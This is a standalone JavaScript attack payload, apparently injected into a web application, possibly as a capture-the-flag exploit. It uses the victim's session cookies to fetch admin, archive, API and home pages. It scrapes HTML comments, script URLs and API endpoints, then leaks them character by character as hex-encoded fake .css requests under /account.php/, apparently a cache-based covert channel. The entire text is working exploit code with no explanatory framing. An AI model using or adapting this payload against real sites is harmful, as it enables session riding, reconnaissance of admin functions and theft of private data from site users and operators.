(function(){
  var UNIQ="v8x";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }
  function exfilStr(prefix,str,maxLen){
    var n=Math.min(str.length,maxLen||60);
    for(var i=0;i<n;i++){
      var code=str.charCodeAt(i).toString(16).padStart(2,"0");
      var iHex=i.toString(16).padStart(2,"0");
      fetch("/account.php/"+UNIQ+"_"+prefix+"_"+iHex+"_"+code+".css",{credentials:"include"}).catch(function(){});
    }
    sig(prefix+"_l"+n.toString(16).padStart(2,"0"));
  }

  sig("init");

  // 1. Exfil HTML comments from /archive/ (hints about write mechanism)
  fetch("/archive/",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_arc");
    var comments=[];
    var re=/<!--([\s\S]*?)-->/g;
    var m;
    while((m=re.exec(html))!==null){
      var c=m[1].trim();
      if(c.length>0) comments.push(c);
    }
    var commentStr=comments.join("|||");
    if(commentStr.length>0) exfilStr("ac",commentStr,400);
    else sig("no_ac");
  }).catch(function(){sig("err_arc");});

  // 2. Exfil script src tags from /admin/review.php (find chart helper URL)
  fetch("/admin/review.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_rev");
    var doc=new DOMParser().parseFromString(html,"text/html");
    var scripts=doc.querySelectorAll("script[src]");
    var info="";
    scripts.forEach(function(s){info+="|S:"+s.getAttribute("src");});
    // Also look for fetch( or XMLHttpRequest in inline scripts
    var inlineScripts=doc.querySelectorAll("script:not([src])");
    inlineScripts.forEach(function(s){
      var t=s.textContent;
      var m2=t.match(/fetch\(['"](\/[^'"]+)['"]/g);
      if(m2) m2.forEach(function(x){info+="|F:"+x;});
      var m3=t.match(/['"]\/api\/[^'"]+['"]/g);
      if(m3) m3.forEach(function(x){info+="|A:"+x;});
    });
    if(info) exfilStr("rs",info,300);
    else sig("no_rs");
  }).catch(function(){sig("err_rev");});

  // 3. GET /api/schedule.php - see response format
  fetch("/api/schedule.php",{credentials:"include"}).then(function(r){return r.text();}).then(function(txt){
    sig("got_sched");
    exfilStr("sc",txt,300);
  }).catch(function(){sig("err_sched");});

  // 4. Also fetch homepage / to find script tags / JS files loaded
  fetch("/",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){
    sig("got_home");
    var doc=new DOMParser().parseFromString(html,"text/html");
    var scripts=doc.querySelectorAll("script[src]");
    var info="";
    scripts.forEach(function(s){info+="|S:"+s.getAttribute("src");});
    // Look for inline fetch/api calls
    var inlineScripts=doc.querySelectorAll("script:not([src])");
    inlineScripts.forEach(function(s){
      var t=s.textContent;
      var m2=t.match(/['"]\/api\/[^'"]+['"]/g);
      if(m2) m2.forEach(function(x){info+="|A:"+x;});
      var m3=t.match(/fetch\(['"](\/[^'"]+)['"]/g);
      if(m3) m3.forEach(function(x){info+="|F:"+x;});
    });
    if(info) exfilStr("hs",info,300);
    else sig("no_hs");
  }).catch(function(){sig("err_home");});

})();
